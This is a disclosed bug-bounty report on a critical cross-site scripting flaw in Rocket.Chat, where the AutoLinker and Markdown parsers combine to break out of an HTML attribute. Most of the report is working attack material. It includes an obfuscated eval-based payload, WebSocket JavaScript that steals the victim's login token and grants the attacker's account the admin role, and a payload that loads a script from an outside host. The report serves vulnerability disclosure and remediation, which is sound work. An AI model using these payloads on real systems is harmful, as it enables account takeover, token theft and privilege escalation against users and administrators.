# Account takeover via XSS

## Report Details
- **Report ID**: 735638
- **URL**: https://hackerone.com/reports/735638
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2019-11-11T20:25:38.352Z
- **Disclosed**: 2021-03-31T08:30:49.240Z

## Reporter
- **Username**: sectex
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: rocket_chat

## Vulnerability Information
**Summary:** By combining AutoLinker and Markdown an attacker is able to inject malicious scripts.

**Description:** By combining AutoLinker and Markdown we can trick the parser into breaking out of the current HTML attribute. 
```
https://a?p=[ ](https:// style=animation-duration:1s;animation-name:blink;animation-iteration-count:2 onanimationiteration=Array.prototype[Symbol.hasInstance]=eval,'alert\x28\x27XSS\x27\x29;'instanceof[] target=_blank data-x=`.`)
```
results in:
```html
<a href="https://a?p=<a href=" https:="" style="animation-duration:1s;animation-name:blink;animation-iteration-count:2" onanimationiteration="Array.prototype[Symbol.hasInstance]=eval,'alert\x28\x27XSS\x27\x29;'instanceof[]" target="_blank" data-x="<span" class="copyonly">`<span><code class="code-colors inline">.</code></span><span class="copyonly">`</span>" target="_blank" rel="noopener noreferrer"&gt; </a>
" target="_blank" rel="noopener noreferrer"&gt;https://a?p==!=7vrXTtDtYHrLJ4Z7y=!="
```

To obtain the login-token of the victim we can either use `document.cookie` or `localStorage.getItem('Meteor.loginToken')`.
Since we can authenticate against the websocket using this token, we can perform any actions in the context of the victim (change password, email etc.).

## Releases Affected:

  * Rocket.Chat-Desktop-Client: v2.16.2
  * Rocket.Chat-Server: v2.0.0
  * Apps-Engine-Version: v1.5.2

## Steps To Reproduce (from initial installation to vulnerability):

In this example, the role `admin` is assigned to the desired user as far as the victim has the required permissions.

Code (replace `{ATTACKER_USERID}` and `{ATTACKER_EMAIL}`):
```javascript
    let ws = new WebSocket(`wss://${window.location.host}/sockjs/111/evilwss/websocket`);
    ws.onmessage = function (evt) {
        if (/\["{\\"msg\\":\\"pong\\"}"\]/.test(event.data)) {
            ws.send('["{\\"msg\\":\\"pong\\"}"]');
        }
        if (/a\["{\\"server_id\\":\\"(.*)\\"}"\]/.test(event.data)) {
            ws.send('["{\\"msg\\":\\"connect\\",\\"version\\":\\"1\\",\\"support\\":[\\"1\\",\\"pre2\\",\\"pre1\\"]}"]');
            ws.send(`["{\\"msg\\":\\"method\\",\\"method\\":\\"login\\",\\"params\\":[{\\"resume\\":\\"${localStorage.getItem('Meteor.loginToken')}\\"}],\\"id\\":\\"1\\"}"]`);
        }
        if (/a\["{\\"msg\\":\\"connected\\",\\"session\\":\\"(.*)\\"}"\]/.test(event.data)) {
            ws.send('["{\\"msg\\":\\"method\\",\\"method\\":\\"insertOrUpdateUser\\",\\"params\\":[{\\"_id\\":\\"{ATTACKER_USERID}\\",\\"statusText\\":\\"\\",\\"email\\":\\"{ATTACKER_EMAIL}\\",\\"verified\\":false,\\"password\\":\\"\\",\\"requirePasswordChange\\":false,\\"joinDefaultChannels\\":false,\\"sendWelcomeEmail\\":false,\\"roles\\":[\\"user\\",\\"admin\\"]}],\\"id\\":\\"17\\"}"]');
        }
    };
```
Payload (replace `sectex.dev\x2ffiles\x2fcswsh.js`):
```
https://a?p=[ ](https:// style=animation-duration:1s;animation-name:blink;animation-iteration-count:2 onanimationiteration=Array.prototype[Symbol.hasInstance]=eval,'s=document.createElement\x28\x27script\x27\x29;s.src=\x27\x68\x74\x74\x70\x73\x3a\x2f\x2fsectex.dev\x2ffiles\x2fcswsh.js\x27;document.body.appendChild\x28s\x29;'instanceof[] target=_blank data-x=`.`)
```

## Supporting Material/References:

  * {F631806}

## Suggested mitigation

  * Fix initial XSS

## Impact

* Attackers can execute scripts which can lead to:
    * Account takeover
    * Abitrary file read in Rocket.Chat-Desktop
    * RCE in Rocket.Chat-Desktop (#276031)

## Attachments
- rocketchat.mp4
